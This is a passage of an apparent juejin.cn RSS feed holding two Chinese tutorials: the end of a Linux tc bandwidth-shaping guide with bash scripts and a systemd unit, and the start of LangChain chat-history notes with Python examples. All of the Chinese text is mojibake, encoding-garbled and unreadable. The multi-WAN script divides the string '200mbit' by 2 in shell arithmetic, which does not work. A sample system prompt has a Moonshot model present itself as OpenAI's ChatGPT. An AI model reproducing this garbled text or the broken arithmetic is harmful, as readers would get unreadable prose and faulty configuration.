  <span class="hljs-keyword">else</span>
    RATE=<span class="hljs-variable">$NIGHT_RATE</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"éå·¥ä½œæ—¶é—´ï¼šè®¾ç½®å¸¦å®½ä¸º <span class="hljs-variable">$NIGHT_RATE</span>"</span>
  <span class="hljs-keyword">fi</span>
  
  <span class="hljs-comment"># è°ƒæ•´é»˜è®¤ç±»åˆ«å¸¦å®½</span>
  tc class change dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:999 htb rate <span class="hljs-variable">$RATE</span> ceil <span class="hljs-variable">$RATE</span>
  
  <span class="hljs-comment"># è®°å½•æ—¥å¿—</span>
  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-subst">$(date)</span>: å¸¦å®½è°ƒæ•´ä¸º <span class="hljs-variable">$RATE</span>"</span> &gt;&gt; /var/log/tc-adjust.log
}

<span class="hljs-comment"># æ·»åŠ åˆ°crontabï¼Œæ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡</span>
<span class="hljs-comment"># 0 * * * * /path/to/dynamic-bandwidth.sh</span>
</code></pre>
<h3 data-id="heading-26">6.2 å¤šç½‘å¡è´Ÿè½½å‡è¡¡</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># multi-wan-balance.sh</span>
<span class="hljs-comment"># å¤šWANå£è´Ÿè½½å‡è¡¡ä¸é™é€Ÿ</span>

WAN1=<span class="hljs-string">"eth1"</span>
WAN2=<span class="hljs-string">"eth2"</span>
TOTAL_BW=<span class="hljs-string">"200mbit"</span>

<span class="hljs-comment"># ä¸ºæ¯ä¸ªWANå£è®¾ç½®HTB</span>
<span class="hljs-keyword">for</span> DEV <span class="hljs-keyword">in</span> <span class="hljs-variable">$WAN1</span> <span class="hljs-variable">$WAN2</span>; <span class="hljs-keyword">do</span>
  tc qdisc add dev <span class="hljs-variable">$DEV</span> root handle 1: htb default 1
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1: classid 1:1 htb rate $((<span class="hljs-variable">$TOTAL_BW</span>/<span class="hljs-number">2</span>))mbit
  
  <span class="hljs-comment"># ä¸ºä¸åŒæœåŠ¡åˆ†é…å¸¦å®½</span>
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:10 htb rate 20mbit ceil 30mbit  <span class="hljs-comment"># HTTP</span>
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:20 htb rate 10mbit ceil 20mbit  <span class="hljs-comment"># SSH</span>
  tc class add dev <span class="hljs-variable">$DEV</span> parent 1:1 classid 1:30 htb rate 50mbit ceil 70mbit  <span class="hljs-comment"># é»˜è®¤</span>
  
  <span class="hljs-comment"># æ·»åŠ è¿‡æ»¤å™¨</span>
  tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 1 u32 \
    match ip dport 80 0xffff flowid 1:10
  tc filter add dev <span class="hljs-variable">$DEV</span> parent 1: protocol ip prio 2 u32 \
    match ip dport 22 0xffff flowid 1:20
<span class="hljs-keyword">done</span>
</code></pre>
<h2 data-id="heading-27">ä¸ƒã€å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-28">Q1: TCè§„åˆ™é‡å¯åä¸¢å¤±ï¼Ÿ</h3>
<p><strong>A</strong>: å°†é…ç½®ä¿å­˜åˆ°å¯åŠ¨è„šæœ¬</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># CentOS/RHEL</span>
echo "/path/to/tc-script.sh" &gt;&gt; /etc/rc.local
chmod +x /etc/rc.local

<span class="hljs-comment"># æˆ–è€…ä½¿ç”¨systemd</span>
cat &gt; /etc/systemd/system/tc-traffic-control.service &lt;&lt; EOF
<span class="hljs-section">[Unit]</span>
<span class="hljs-attr">Description</span>=Traffic Control Service
<span class="hljs-attr">After</span>=network.target

<span class="hljs-section">[Service]</span>
<span class="hljs-attr">Type</span>=<span class="hljs-literal">on</span>eshot
<span class="hljs-attr">ExecStart</span>=/path/to/tc-script.sh
<span class="hljs-attr">RemainAfterExit</span>=<span class="hljs-literal">yes</span>

<span class="hljs-section">[Install]</span>
<span class="hljs-attr">WantedBy</span>=multi-user.target
EOF
</code></pre>
<h3 data-id="heading-29">Q2: å¦‚ä½•æŸ¥çœ‹å®æ—¶æµé‡ï¼Ÿ</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># ä½¿ç”¨iftopæŸ¥çœ‹å®æ—¶æµé‡</span>
iftop -i eth0 -n

<span class="hljs-comment"># ä½¿ç”¨nethogsæŸ¥çœ‹è¿›ç¨‹æµé‡</span>
nethogs eth0

<span class="hljs-comment"># TCç›‘æ§è„šæœ¬</span>
watch -n 1 "tc -s qdisc show dev eth0<span class="hljs-comment">; echo '---'; tc -s class show dev eth0"</span>
</code></pre>
<h3 data-id="heading-30">Q3: é™é€Ÿä¸ç”Ÿæ•ˆï¼Ÿ</h3>
<ol>
<li>æ£€æŸ¥å•ä½ï¼šç¡®ä¿ä½¿ç”¨æ­£ç¡®çš„å•ä½ï¼ˆmbit vs mbyteï¼‰</li>
<li>æ£€æŸ¥è®¾å¤‡ï¼šç¡®ä¿åœ¨æ­£ç¡®çš„ç½‘ç»œæ¥å£ä¸Šé…ç½®</li>
<li>æ£€æŸ¥æ–¹å‘ï¼šTCä¸»è¦æ§åˆ¶å‡ºç«™ï¼ˆegressï¼‰æµé‡</li>
<li>æ£€æŸ¥ä¼˜å…ˆçº§ï¼šè¿‡æ»¤å™¨çš„prioå€¼å¯èƒ½å½±å“åŒ¹é…é¡ºåº</li>
</ol>
<h2 data-id="heading-31">å…«ã€æ€»ç»“</h2>
<p>TCæ˜¯Linuxç³»ç»Ÿä¸­å¼ºå¤§çš„æµé‡æ§åˆ¶å·¥å…·ï¼Œè™½ç„¶å­¦ä¹ æ›²çº¿è¾ƒé™¡å³­ï¼Œä½†ä¸€æ—¦æŒæ¡ï¼Œå°±èƒ½ç²¾ç»†æ§åˆ¶ç½‘ç»œæµé‡ã€‚å…³é”®ç‚¹ï¼š</p>
<ol>
<li><strong>ç†è§£æ¶æ„</strong>ï¼šqdisc-class-filterä¸‰çº§ç»“æ„</li>
<li><strong>é€‰å¯¹é˜Ÿåˆ—</strong>ï¼šHTBé€‚åˆå¤§å¤šæ•°åœºæ™¯ï¼Œç®€å•ä¸”åŠŸèƒ½å¼ºå¤§</li>
<li><strong>ç²¾ç»†åˆ†ç±»</strong>ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚åˆ›å»ºåˆç†çš„ç±»åˆ«</li>
<li><strong>æ­£ç¡®è¿‡æ»¤</strong>ï¼šä½¿ç”¨u32æˆ–fwç­‰è¿‡æ»¤å™¨ç²¾ç¡®åŒ¹é…æµé‡</li>
<li><strong>ç›‘æ§è°ƒè¯•</strong>ï¼šé€šè¿‡ç»Ÿè®¡ä¿¡æ¯éªŒè¯æ•ˆæœï¼ŒåŠæ—¶è°ƒæ•´</li>
</ol>
<p>é€šè¿‡åˆç†çš„TCé…ç½®ï¼Œå¯ä»¥å®ç°ï¼š</p>
<ul>
<li>å…³é”®ä¸šåŠ¡å¸¦å®½ä¿éšœ</li>
<li>é˜²æ­¢å¸¦å®½æ»¥ç”¨</li>
<li>æé«˜ç½‘ç»œç¨³å®šæ€§</li>
<li>ä¼˜åŒ–ç”¨æˆ·ä½“éªŒ</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[langchainå­¦ä¹ æ€»ç»“-ChatMessage ç»„ä»¶å­¦ä¹ ç¬”è®°]]></title>    <link>https://juejin.cn/post/7592582130593939507</link>    <guid>https://juejin.cn/post/7592582130593939507</guid>    <pubDate>2026-01-08T02:31:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592582130593939507" data-draft-id="7592552501579333658" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="langchainå­¦ä¹ æ€»ç»“-ChatMessage ç»„ä»¶å­¦ä¹ ç¬”è®°"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T02:31:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¿ƒåœ¨é£æ‰¬AI"/> <meta itemprop="url" content="https://juejin.cn/user/1556564194366823"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            langchainå­¦ä¹ æ€»ç»“-ChatMessage ç»„ä»¶å­¦ä¹ ç¬”è®°
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1556564194366823/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¿ƒåœ¨é£æ‰¬AI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:31:12.000Z" title="Thu Jan 08 2026 02:31:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ChatMessage ç»„ä»¶å­¦ä¹ ç¬”è®°</h2>
<h3 data-id="heading-1">ä¸€ã€ChatMessage æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>ChatMessageï¼ˆèŠå¤©æ¶ˆæ¯å†å²ç»„ä»¶ï¼‰æ˜¯ LangChain æ¡†æ¶ä¸­ç”¨äºç®¡ç†å’Œå­˜å‚¨å¯¹è¯å†å²çš„ç»„ä»¶ã€‚å®ƒæä¾›äº†å¤šç§å®ç°æ–¹å¼ï¼ŒåŒ…æ‹¬å†…å­˜å­˜å‚¨å’Œæ–‡ä»¶å­˜å‚¨ï¼Œèƒ½å¤Ÿå¸®åŠ© AI åº”ç”¨ç¨‹åºå®ç°å¤šè½®å¯¹è¯çš„ä¸Šä¸‹æ–‡è®°å¿†åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-2">æ ¸å¿ƒç‰¹æ€§</h4>
<ul>
<li>è‡ªåŠ¨ç®¡ç†å¯¹è¯å†å²</li>
<li>æ”¯æŒå¤šç§å­˜å‚¨åç«¯ï¼ˆå†…å­˜ã€æ–‡ä»¶ã€æ•°æ®åº“ç­‰ï¼‰</li>
<li>æä¾›ç»Ÿä¸€çš„æ¥å£æ¥æ“ä½œæ¶ˆæ¯</li>
<li>æ”¯æŒ Humanï¼ˆç”¨æˆ·ï¼‰ã€AIï¼ˆåŠ©æ‰‹ï¼‰ã€Systemï¼ˆç³»ç»Ÿï¼‰ç­‰å¤šç§æ¶ˆæ¯ç±»å‹</li>
</ul>
<h3 data-id="heading-3">äºŒã€ChatMessage æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h3>
<h4 data-id="heading-4">1. å®ç°å¤šè½®å¯¹è¯</h4>
<p>è®© AI èƒ½å¤Ÿè®°ä½ä¹‹å‰çš„å¯¹è¯å†…å®¹ï¼Œå®ç°è¿è´¯çš„å¤šè½®å¯¹è¯ä½“éªŒã€‚</p>
<h4 data-id="heading-5">2. ä¸Šä¸‹æ–‡ç®¡ç†</h4>
<p>è‡ªåŠ¨ç®¡ç†å¯¹è¯çš„ä¸Šä¸‹æ–‡ï¼Œé¿å…æ‰‹åŠ¨æ‹¼æ¥å†å²æ¶ˆæ¯çš„ç¹çå·¥ä½œã€‚</p>
<h4 data-id="heading-6">3. æŒä¹…åŒ–å­˜å‚¨</h4>
<p>æ”¯æŒå°†å¯¹è¯å†å²ä¿å­˜åˆ°æ–‡ä»¶æˆ–æ•°æ®åº“ï¼Œå®ç°è·¨ä¼šè¯çš„è®°å¿†åŠŸèƒ½ã€‚</p>
<h4 data-id="heading-7">4. ç®€åŒ–å¼€å‘</h4>
<p>æä¾›ç®€æ´çš„ APIï¼Œå¼€å‘è€…æ— éœ€å…³æ³¨åº•å±‚å­˜å‚¨ç»†èŠ‚ã€‚</p>
<h3 data-id="heading-8">ä¸‰ã€ä¸»è¦å®ç°ç±»</h3>
<h4 data-id="heading-9">1. InMemoryChatMessageHistoryï¼ˆå†…å­˜å­˜å‚¨ï¼‰</h4>
<p><strong>ç”¨é€”ï¼š</strong> å°†å¯¹è¯å†å²å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œé€‚åˆä¸´æ—¶å¯¹è¯æˆ–å•æ¬¡ä¼šè¯åœºæ™¯ã€‚</p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>é€Ÿåº¦å¿«</li>
<li>æ— éœ€é¢å¤–é…ç½®</li>
<li>é€‚åˆæµ‹è¯•å’Œå¼€å‘</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>ç¨‹åºé‡å¯åæ•°æ®ä¸¢å¤±</li>
<li>ä¸æ”¯æŒè·¨ä¼šè¯è®°å¿†</li>
</ul>
<h4 data-id="heading-10">2. FileChatMessageHistoryï¼ˆæ–‡ä»¶å­˜å‚¨ï¼‰</h4>
<p><strong>ç”¨é€”ï¼š</strong> å°†å¯¹è¯å†å²æŒä¹…åŒ–åˆ°æ–‡ä»¶ä¸­ï¼Œé€‚åˆéœ€è¦é•¿æœŸä¿å­˜å¯¹è¯è®°å½•çš„åœºæ™¯ã€‚</p>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li>æ•°æ®æŒä¹…åŒ–</li>
<li>è·¨ä¼šè¯è®°å¿†</li>
<li>ç®€å•å¯é </li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li>è¯»å†™é€Ÿåº¦ç›¸å¯¹å†…å­˜æ…¢</li>
<li>å¹¶å‘è®¿é—®éœ€è¦æ³¨æ„æ–‡ä»¶é”</li>
</ul>
<h3 data-id="heading-11">å››ã€ä»£ç ç¤ºä¾‹ä¸è¾“å‡º</h3>
<h4 data-id="heading-12">ç¤ºä¾‹ 1ï¼šå†…å­˜å¯¹è¯æ¶ˆæ¯å†å²ç»„ä»¶</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> langchain_core.chat_history <span class="hljs-keyword">import</span> InMemoryChatMessageHistory

chat_history = InMemoryChatMessageHistory()

chat_history.add_user_message(<span class="hljs-string">"ä½ å¥½ï¼Œæˆ‘æ˜¯cccï¼Œä½ æ˜¯è°"</span>)
chat_history.add_ai_message(<span class="hljs-string">"ä½ å¥½ï¼Œæˆ‘æ˜¯chatgptï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åˆ°ä½ ï¼Ÿ"</span>)

<span class="hljs-built_in">print</span>(chat_history.messages)
</code></pre>
<p><strong>è¾“å‡ºç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-python" lang="python">[
    HumanMessage(
        content=<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯cccï¼Œä½ æ˜¯è°'</span>,
        additional_kwargs={},
        response_metadata={}
    ),
    AIMessage(
        content=<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯chatgptï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åˆ°ä½ ï¼Ÿ'</span>,
        additional_kwargs={},
        response_metadata={},
        tool_calls=[],
        invalid_tool_calls=[]
    )
]
</code></pre>
<p><strong>è¯´æ˜ï¼š</strong></p>
<ul>
<li><code>add_user_message()</code> - æ·»åŠ ç”¨æˆ·æ¶ˆæ¯</li>
<li><code>add_ai_message()</code> - æ·»åŠ  AI æ¶ˆæ¯</li>
<li><code>messages</code> å±æ€§ - è·å–æ‰€æœ‰å†å²æ¶ˆæ¯åˆ—è¡¨</li>
</ul>
<h4 data-id="heading-13">ç¤ºä¾‹ 2ï¼šæ–‡ä»¶å¯¹è¯æ¶ˆæ¯å†å²ç»„ä»¶å®ç°è®°å¿†</h4>
<p><strong>ä»£ç ï¼š<a href="https://link.juejin.cn?target=2.%2520%25E6%2596%2587%25E4%25BB%25B6%25E5%25AF%25B9%25E8%25AF%259D%25E6%25B6%2588%25E6%2581%25AF%25E5%258E%2586%25E5%258F%25B2%25E7%25BB%2584%25E4%25BB%25B6%25E5%25AE%259E%25E7%258E%25B0%25E8%25AE%25B0%25E5%25BF%2586.py" target="_blank" title="2.%20%E6%96%87%E4%BB%B6%E5%AF%B9%E8%AF%9D%E6%B6%88%E6%81%AF%E5%8E%86%E5%8F%B2%E7%BB%84%E4%BB%B6%E5%AE%9E%E7%8E%B0%E8%AE%B0%E5%BF%86.py" ref="nofollow noopener noreferrer">2. æ–‡ä»¶å¯¹è¯æ¶ˆæ¯å†å²ç»„ä»¶å®ç°è®°å¿†.py</a></strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> dotenv
<span class="hljs-keyword">from</span> langchain_community.chat_message_histories <span class="hljs-keyword">import</span> FileChatMessageHistory
<span class="hljs-keyword">from</span> openai <span class="hljs-keyword">import</span> OpenAI

dotenv.load_dotenv()

client = OpenAI(base_url=<span class="hljs-string">'https://api.moonshot.cn/v1'</span>)
chat_history = FileChatMessageHistory(<span class="hljs-string">'./memory.txt'</span>)

<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    query = <span class="hljs-built_in">input</span>(<span class="hljs-string">"Human:"</span>)

    <span class="hljs-keyword">if</span> query == <span class="hljs-string">"q"</span>:
        exit(<span class="hljs-number">0</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">"AI"</span>, flush=<span class="hljs-literal">True</span>, end=<span class="hljs-string">""</span>)

    system_prompt = (
        <span class="hljs-string">"ä½ æ˜¯OpenAiå¼€å‘çš„ChatGptèŠå¤©æœºå™¨äººï¼Œå¯ä»¥æ ¹æ®ç›¸å¯¹åº”çš„ä¸Šä¸‹æ–‡å›å¤ç”¨æˆ·æ¶ˆæ¯ï¼Œä¸Šä¸‹æ–‡å­˜æ”¾çš„æ˜¯äººç±»å’Œä½ çš„å¯¹è¯ä¿¡æ¯åˆ—è¡¨"</span>
        <span class="hljs-string">f"&lt;context&gt;<span class="hljs-subst">{chat_history}</span>&lt;/context&gt;\n\n"</span>
    )
    <span class="hljs-built_in">print</span>(chat_history, <span class="hljs-string">'chat_history'</span>)

    response = client.chat.completions.create(
        model=<span class="hljs-string">'moonshot-v1-8k'</span>,
        messages=[
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"system"</span>, <span class="hljs-string">"content"</span>: system_prompt},
            {<span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>, <span class="hljs-string">"content"</span>: query}
        ],
        stream=<span class="hljs-literal">True</span>,
    )

    ai_content = <span class="hljs-string">""</span>

    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> response:
        content = chunk.choices[<span class="hljs-number">0</span>].delta.content
        <span class="hljs-keyword">if</span> content <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">break</span>
        ai_content += content
        <span class="hljs-built_in">print</span>(content, flush=<span class="hljs-literal">True</span>, end=<span class="hljs-string">""</span>)

    chat_history.add_user_message(query)
    chat_history.add_ai_message(ai_content)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">""</span>)
</code></pre>
<p><strong>äº¤äº’ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-bash" lang="bash">Human: ä½ å¥½
AI[] chat_history
ä½ å¥½ï¼æˆ‘æ˜¯ChatGPTï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ
Human: æˆ‘å«ccc
AI[HumanMessage(content=<span class="hljs-string">'ä½ å¥½'</span>, additional_kwargs={}, response_metadata={}), AIMessage(content=<span class="hljs-string">'ä½ å¥½ï¼æˆ‘æ˜¯ChatGPTï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ'</span>, additional_kwargs={}, response_metadata={}, tool_calls=[], invalid_tool_calls=[])] chat_history
ä½ å¥½cccï¼å¾ˆé«˜å…´è®¤è¯†ä½ ï¼Œæœ‰ä»€ä¹ˆæˆ‘å¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ
Human: q
(ç¨‹åºé€€å‡º)
</code></pre>
<p><strong>memory.txt æ–‡ä»¶å†…å®¹ï¼ˆæŒä¹…åŒ–å­˜å‚¨ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">[</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"human"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ å¥½"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"additional_kwargs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ai"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ä½ å¥½ï¼æˆ‘æ˜¯ChatGPTï¼Œæœ‰ä»€ä¹ˆå¯ä»¥å¸®åŠ©ä½ çš„å—ï¼Ÿ"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"additional_kwargs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"invalid_tool_calls"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"human"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"data"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"æˆ‘å«ccc"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"additional_kwargs"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"response_metadata"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
